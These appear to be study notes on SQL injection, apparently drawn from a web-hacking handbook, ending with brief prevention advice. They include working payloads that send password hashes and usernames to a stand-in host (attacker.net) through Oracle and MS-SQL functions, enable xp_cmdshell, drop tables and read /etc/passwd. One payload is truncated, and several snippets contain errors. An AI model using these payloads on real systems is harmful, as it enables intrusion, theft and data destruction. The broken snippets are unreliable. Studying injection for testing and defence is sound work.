# Attacking Data Stores

# Injecting Into Interpreted Contexts
many of web application used SQL,LDAP,pert and PHP as its core Language while developing application, 
- so how interpreted language are executed, a family of family vulnerabilities arise known as `Code Injection`, in any useful application user supplied data are received, manipulated and acted on.
- in compiled application code injection is not possible due to in `binary bits` format, instead of grammatical syntax

# Bypassing Login
**NOTE:** injecting into interpreted context to alter application logic is a generic attack technique, this also arise in `LDAP Queries`, `XPATH queries`, `message queue implementation` or indeed any custom Query language

# Injecting into SQL 
- arise due to passing of dangerous data from source to Sink of sql query without sanitizing the user input

# Injecting Into Different Statement Types
- since we didnt know which sql query or statement has been implemented to target application, we need to guess it
- it may use `select`,`update`,`delete` etc 

## Select StateMents
- in this query user input must be at `where` clause 
## INSERT Statements
**TIP** when attempting to inject into `INSERT` statement, we may not know in advance how many parameters are required, or what their types are, in preceding situation we can keep adding fields to the `VALUES` clause until the desired user account is actually created
- eg, we inject in user name
```bash
if GET parameter use +--+ 
Post paramter use (space)--(space) 
foo')+--+ or foo') -- 
foo',1)+--+ or foo',NULL) -- 
foo',1,1) -- or foo',NULL,NULL) -- 
etc until we register with username foo
```
- since most database implicitly cast an integer to a string, an integer value can be used at each position, in this case username of `foo` and password `1` 
- if find `1` is still rejected, we use `2000`, which many DB also implicitly cast to `data-based data type`

## UPDATE Statements
- it used to Modify or Update value in Database tables
- may present at `updating contect,changing password, changing quantity of order`
**NOTE:**
- probing for SQL injection vulnerability in Remote application is always potentially dangerous, because we have no idea of knowing in advance quite what action the application will perform using `crafted input`, some times simple `crafted input` like `admin' or 1=1 -- `cause critical damage
- if query is `Update users SET password='123' where user='admin'or 1=1` this will change the password of all the users, which is dangerous, so always be careful when `probing for SQLI`

## DELETE Statements
- used to delete data from the data base table
- it also have same caution what `UPDATE` statement have, may be all the user account will be deleted if we user 1=1 -- so be careful while probing that type of potential endpoint

# Finding SQL Injection vulnerability
**NOTE:** this may be at all `URL parameters`, `cookies`, `items of POST data`, `HTTP headers`, in all cases vulnerability may exist in the Handling of both `Name and Value` of relevant Parameter

**TIP:** first go through manual steps so if some multistage process is there, and data is only submitted at the last stage to the backend database

## Injecting into String Data
### HACK Step
   1. submit single quote`'` in the data, observe error occurs, or result differ from orignal
   2. if single `'` give error then use `' '` to escape the sequence and error has been gone now, probabily vuln to SQLI
   3. further verification we use string concatenator char
	   1. Oracle  '||'foo
	   2. MSSQL   '+'foo
	   3. Mysql    '(space)'foo
## Injecting Into Numeric Data
### HACK Step
   1. Try supplying a Simple Mathematical expression that is equivalent to the original numeric value, eg. if original value is 2 , submit 1+1 or 3-1, if application responds in the same way, it may be vulnerable
   2. the preceding test is most reliable in cases where we have confirmed the item being modified has noticeable effect on the application's behavior, if application uses numeric pageId param, to specify which content should be returned, substituting 1+1 for 2 with equivalent results is good sign that SQL Injection is present, how ever if we place arbitrary input to numeric param without change the precedance provides no evidence of vuln'
   3. if 1st  test is successful, we obtain vuln of evidence , with Sql-Specific Keywords and Syntax, eg `ASCII` command, which return `ascii code for supplied char` the following expression is equivelent to 3 `67-ASCII('A')`
   4. The preceding test will not work if single quotes are being filtered.However, in this situation you can exploit the fact that databases  implicitly convert numeric data to string data where required. Hence, because the ASCII value of the character 1 is 49, the following expression is equivalent to 2 in SQL: 51-ASCII(1)
**TIP**:
   space and special char are not allowed in request body or param, so we URL encode that charecter so it take effect as we want
   \+ used for encoding Space, so if want to use actual + we use encoded i.e. `%2b`
   
## Injecting Into The Query Structure
- some user-supplied data is being inserted into the structure of the SQL query itself, rather than an item of data in query.
- exploiting this type is `NO Escaping is required` 
- we use `ORDER BY ASC` or `ORDER BY DESC` or `ORDER BY 1` etc
- some user supplied input may specify a column name within where clause,since these are also not encapsulated in a single quote,
- finding this can be difficult, 
**NOTE:** some conventional sql injection defenses can not be implemnted for user-specified column names, using prepared statements or escaping single quotes will not prevent this type of SQL injection, as this vector is a key one to look for in modern application
### HACK Step
   1. make note of param that appears to control the order, or field type within the result that the application returns
   2. make a series of requests supplying a numeric value in the parameter value,start with 1 and incrementing it with each subsequent request
	   1. if changing number, effect the ordering of result, probabily inserted in `ORDER BY` clause,
	   2. we conform with using `ASC -- ` and `DESC -- `

# Fingerprinting Database
## MYsql, MSsql, sqlite, Postgresql use information_schema.colums, this we retrieve data base info using information_schema

## Oracle  SELECT table_name, column_name from all_tab_columns to retrieve tables and columns

**TIP:** when multiple columns are returned from a target Table, these can be concatenated into a single column
- ORACLE :   SELECT table_name||':'|| columns_name FROM all_tab_columns
- MS-SQL : SELECT table_name+':'+column_name from information_schema.columns
- MY-SQL : SELECT CONCAT(table_name,':',column_name) from information_schema.columns

# Bypassing Filters
- some application that is vulnerable to SQL injection may implement various input filters that prevent you from exploiting the flow without restrictions, eg. application remove or sanitize certain characters or block common sql keywords

## Avoiding Blocked Characters
- if application removes or encodes some character that are often used in SQLI, 
	- if we inject it in numeric field or column name, we use various ASCII codes
	- eg. select ename, sal from emp where ename='marcus'
	- SELECT ename,sal from emp where ename=CHR(109)||CHR(97)||CHR(114)||CHR(99)||CHR(117)||CHR(115) `for ORACLE`
	- SELECT ename,sal FROM emp WHERE ename=CHAR(109)+CHAR(97)+CHAR(114)+CHAR(99)+CHAR(117)+CHAR(115)  `for MS-SQL`

- if comment symbol is blocked, instead of comment try to balance the Query by adding quate
	- instead of using  `'  or 1=1 -- `
	- use this one `' or 'a'='a`
	
## Circumventing Simple Validation
- some input validation blacklisted or block or remove any supplied data that appears on the list.
- eg. if SELECT key word is blocked or removed then try this
	- SeLeCt
	- %00SELECT
	- SELSELECTECT
	- %53%45%4c%45%43%54
	- %2553%2545%254c%2545%2543%2554
## Using SQL Comments
- we use SQL inline Comments as we use in C/c++
	- SELECT/\*foo\*/username,password/\*foo\*/FROM/\*foo\*/users
	- In My SQL Comments can even be inserted within Keyword themselves 
		- SEL/\*foo\*/ECT username,passwd FROM users

# Second-Order SQLI
- Many application handle data safely when it is first inserted into DB, once data is stored in DB, it may be processed in UNSafe Way later, either by application or by other back-end process
- eg. application handles username in safe way by adding additional `''` but when user try to change the password, it fetch the user name and the validation is not implemented at that stage, this will cause the error for the DB, 
- attacker simply craft a username like `admin') -- ` this doesn't harm at time of registration, but when the password change is happen it execute out malicious query .
# Blind SQLI Via OAST data exfil
```bash
UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a`
```

# Advanced Exploitation
- some time application have some defense mechanism that attacker can not steal sensitive data, and also our injected query will not return any where
**NOTE**: Application owner should be aware that not every attacker is interested in stealing Sensitive Data, some may be more Destructive for eg
- 'shutdown-- ' `MSSQL` used to shutdown database with this command
- attacker also drop or delete tables or columns
    eg . 'drop table users-- '
        ' drop table accounts-- '
		'drop table customers-- '
		
## Retrieving Data As Numbers
 it is fairly common to find that no string field within an application are  vulnerable to SQL injection, input with `'` are handled properly, however vulnerability may exist within numeric data fields, where user input is not encapsulated within single quote
 - in this situation, to retrieve data via neumeric response have 2 possibility 
	 - ASCII, which returns ASCII code for the input 
	 - SUBSTRING(or SUBSTR in `ORACLE`) which returns a substring of its input
 - eg. SUBSTEING('Admin',1,1) returns A
 -     ASCII('A') returns 65
 -  therefore ASCII(SUBSTR('Admin',1,1)) returns 65
 In a variation on this situation, the authors have encountered cases in which what is returned by the application is not an actual number, but a resource for which that number is an identifi er. The application performs a SQL query based on user input, obtains a numeric identifier for a document, and then returns the document’s contents to the user. In this situation, an attacker can first obtain a copy of every document whose identifiers are within the relevant numeric range and construct a mapping of document contents to identifi ers. Then, when performing the attack described previously, the attacker can consult this map to determine the identifier for each document received from the application and thereby retrieve the ASCII value of the character has successfully extracted.

## Using an Out-Of-band Channel
- sometimes application doesn't return any output of injected query, nor return any error message generated by DB, 
- creating OUT-of-band channel for Data Exfilteration ,so that database connect back to us with desired data , but this process varies Database TO database
- we can see documentation for specific data base to see how it connect to the remote location

### MS-SQL
  - insert into openrowset('SQLOLEDB','DRIVER={SQL server};SERVER=attacker.net,80; UID=sa;Pwd=hacked','select \* from foo') values(@@version)
### Oracle
  - Oracle contains Large amount of default functionality that is accessible 
  - `UTL_HTTP` package can be used to make HTTP Requests to Other hosts, it have functionality and supports `proxy server, cookies, redirects and Authentication` 
  - eg
  ```bash
  /employee.jsp?EmpNo=1337'||UTL_HTTP.request('attacker.net:80/'||(SELECT%20usernames%20FROM%20all_users%20Where%20ROWNUM%3d1)) -- 
  ```
  it make GET request for URL Containing first username in the table all_users 
  attacker simply open listener to accept request and data
  - `UTL_INADDR` package is designed to be used to resolve hostnames to IP addr, it can be used to generate arbitrary DNS queries to a server Controlled by Attacker, we use Burp Collaborator, and Also DNS lookup bypass restriction of Firewall easily, even if HTTP traffic is Restricted
  - eg.
  ```bash
  /employee.jsp?EmpNo=1337'||UTL_INADDR.GET_HOST_NAME((SELECT%20PASSWORD%20FROM%20DB_USERS%20WHERE%20NAME='SYS')||'.attacker.net')
  ```
  - this result in DNSquery to the `attacker.net` name server containing the 'SYS' password hash as subdomain.
  - **NOTE:** in oracle Additional ACL protects many of the resource execution by arbitrary  database user, to bypass restriction we use new functionality provided by oracle
  ```bash
  SYS.DBMS_LDAP.INIT((SELECT PASSWORD FROM SYS.USER$ WHERE NAME='SYS')||'.attacker.net',80)
  ```
  
  ### My SQL
   - SELECT .... INTO OUTFILE command can be used to direct output from arbitrary query into file
   ```bash
SELECT * into outfilr '\\\\attacker.net\\share\\output.txt' from users;
```
to receive file we need to open SMB share on computer that allows anonymous write access,

## Using inference: conditional Response
- there is many reason why out-of-band channel may be unavailable, most commonly because database is located within a protected network
- eg admin' AND 1=1 -- & admin' AND 1=2 cause different result 
- we make conditional query and extract data from the conditional response
- admin ' AND ASCII(SUBSTRING('ADMIN',1,1))=65 -- 

## Inducing Conditional Errors
- in this if value is true then, it generates error ,or else if condition is false, then never get error
- eg `ORACLE`
```bash
SELECT 1/0 FROM DUAL WHERE (SELECT username from all_users Whrer username='DBSNMP')='DBSNMP'
```
here is condition is true then 1 st query executed and error is caused by the database
- if condition is true then 1st query never executed and never got error
- another for generating conditional error 
```bash
(select 1 where ASCII('admin',1,1)=66 or 1/0 =0)
```
some time it is not possible to use `UNION` query, like after `ORDER BY` we cant use UNION so here we use conditional error
```bash
/search.jsp?depar=20&sort=(select%201/0%20from%20dual%20where%20(select%20substr(max(object_name),1,1)%20from%20user_objects)='y')
```
if 1 st letter of object name is `y` then it cause the data base to execute 1/0 and generate error in the database

## USing Time Delays
   - if all above technique is fails than we use Time delay or craft query that cause `time delays` in the response
### MS-SQL WAITFOR command
`(select User) = 'as' waitfor delay '0:0:5'`
- if ASCII(SUBSTRING('admin',1,1))=64 waitfor delay '0:0:5'
- some time we retrieve data bit by bit using POWER()
- do test on 1st bit`if ASCII(SUBSTRING('Admin',1,1)) & (POWER(2,1)))>0 waitfor delay '0:0:5'`
- this test on 2nd bit `if ASCII(SUBSTRING('Admin',1,1)) & POWER(2,1))>0 waitfor delay '0:0:5'`

### MY-SQL sleep()
- `SELECT if(user) like 'root', sleep(5000), 'false')`

### POSTGRESQL PG_SLEEP()
### Oracle 
- have no function to trigger Time delay
- for this we connect UTL_HTTP to nonexistent sever this cause timeout and time delay in response

**TIP**
- time delay technique can also be immensely useful when performing Initial Probing of application to detect SQLI vuln.
- '; waitfor delay '0:30:0' -- 
- 1; waitfor delay '0:30:0' -- 

# Beyond SQLI: Escalating the Database Attack
- some SQLI vuln often results in total compromise of all application data, since most application rely on single account for database access 
- some time after compromising data can be not a stop point for us, we may escalate attack, by exploiting vulnerability in the database or using built in functions
	- if database is shared with other applications, we may able to escalate privileges within the database and gain access to other application's data.
	- we might compromise OS of the database server
	- we may gain network access to other systems, since this are situated at protected layer of network, after compromise attacker are at trusted position and reach some key service on other hosts
	- we might able to make network connection back out of hosting infrastructure to our own computer,
	- we may create user defined function and execute
	
**BOOK for Deep Research:**`The Database Hacker's Handbook`

## MS-SQL
- for MS-SQL we use built in functionality/ by default `xp_cmdshell`, this stored procedure allow users with DBA permission to execute OS command
```bash
master..xp_cmdshell 'ipconfig'>foo.txt
```
some other built in stored procedure
- `xp_regread` and `xp_regwrite` used to perform action within registry of windows os

### Dealing with default lockdown
- some defensive technique is used to disable `xp_cmdshell ` so no one can exploit it but is compromise database user is high privileged then overcome this obstacles by reconfiguring the DB
- xp_cmdshell is disabled then we reconfigure DB
```bash
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE WITH OVERRIDE
EXECUTE sp_configure 'xp_cmdshell','1'
RECONFIGURE WITH OVERRIDE
```
as xp_cmdshell is re-enabled we use it
`exec xp_cmdshell 'dir/command we want to run'`

## ORACLE
 - oracle contain built-in stored procedures that execute with DBA privileges 
 - this can be abused to escalate priv, and execute command on OS

## MY-SQL
- my-sql contains relatively little built-in functionality that attacker can misuse, any user with `FILE_PRIV` permission to read and write to the filesystem
```bash
select load_file('/etc/passwd')
```
- in addition reading & writing in OS file system, it lead to other attacks
	- Because MY-SQL Stored its data in PLAIN text files, since attacker have read permission can use any data stored in the database, bypassing access control rights
	- MYSQL enables used to create user-defined functions(UDFs) by calling out to complied library file that contains the function implementation readmore on `Hackproofing MYSQL`

## Using SQL Exploitation Tools
- sqlmap is best for automatic exploitation after vulnerability  finding, 

# SQL Syntax and Error Reference
- some database have minor change is the syntax that we need to consider while probing 
## SQL Syntax
|Requirement:|ASCII and SUBSTRING|
|---|---|
|Oracle:| ASSCI('A')is equal to 65 & SUBSTR('ABCD',2,3) equal to bcd  |
|MS-SQL:|ASCII('A') is equal to 65 & SUBSTRING('ABCD',2,3) equal to BCD |
|MY-SQL:|ASCII('A') is equal to 65 & SUBSTRING('ABCD',2,3) equal to BCD|

-----------------------------------------------------
|Requirements:| Retrieve Current Database user|
|---|---|
|Oracle:|select sys.login_user from dual Select user from dual SYS_CONTEXT('USERENV','SESSION_USER')|
|MS-SQL:| select suser_name()|
|MY-SQL:| SELECT user()|

-----------------------------------------------------
|Requirements:|Cause Time delay|
|---|---|
|Oracle:|Utl_Http.request('http://nonexitemtdomain')|
|Ms-SQL:|waitfor delay '0:0:10' or exec master..xp_cmdshell 'ping localhost'|
|My-SQL:| sleep(1000)|

-----------------------------------------------------
|Requirements:| Retrive Database version string|
|---|---|
|Oracle:| select banner from V$version|
|Ms-SQL:| select @@version|
|My-SQL:| select @@version|

-----------------------------------------------------
|Requirements:|retrieve current Database|
|---|---|
|Oracle:| SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM Dual|
|MS-SQL:| select db_name() & server name can be using SELECT @@servername|
|My-SQL:|SELECT database()|

-----------------------------------------------------
|Requirements:| Retrieve current user's Privilege|
|---|---|
|Oracle:| Select privilege FROM session_privs|
|MS-SQL:| SELECT grantee, table_name, privilege_type FROM INFORMATION_SCHEMA.TABLE_PRIVILEGES|
|My-SQL:| SELECT * FROM information_schema.user_privileges WERE grantee = ‘[user]’ where [user] is determined rom the output of SELECT user()|

-----------------------------------------------------
|Requirement :| Show all tables and columns in single columns of result|
|---|---|
|Oracle:|Select table_name||''||column_name from all_tab_columns|
|Ms-SQL:| SELECT table_name+' '+column_name from information_schema.columns|
|My-SQL:| SELECT CONCAT(table_name,column_name) from information_schema.columns|

-----------------------------------------------------
|Requirements:| Show user object|
|---|---|
|Oracle:|SELECT object_name, object_type FROM user_objects|
|Ms-SQL:|SELECT name FROM sysobjects|
|My-SQL:| SELECT table_name FROM information_schema.tables|

-----------------------------------------------------
|Requirements:|Show user tables|
|---|---|
|ORACLE:| SELECT table_name FROM all_tables OR SELECT object_name, object_type FROM user_objects WHERE object_type='TABLE'|
|MS-SQL:|SELECT name FROM sysobjects WHERE xtype='U'|
|My-SQL:|SELECT table_name FROM information_schema.tables where table_type='BASE TABLE' and table_schema!='mysql'|

-----------------------------------------------------
|Requirements:| Show Column names for Table foo|
|---|---|
|Oracle:|SELECT column_name, name FROM user_tab_columns WHERE table_name = 'foo'|
|Ms-SQL:| SELECT column_name FROM information_schema.columns WHERE table_name='foo'|
|My-SQL:|SELECT column_name FROM information_schema.columns WHERE table_name='foo'|

-----------------------------------------------------
|Requirements:| Interact with OS|
|---|---|
|Oracle:| see oracle hacker's handbook |
|Ms-SQL:| EXEC xp_cmdshell 'dir c:\\'|
|My-SQL:| Select load_file('/etc/passws')|

------------------------------------------

## For different error message se Webapplication hackers handbook ch.9 334/370 pg.no

# Preventing SQLI
- use prameterise Query
- make other permission specific account for database, and give read and wright access to account who need it
- also application use lowest possible level of privileges when accessing database


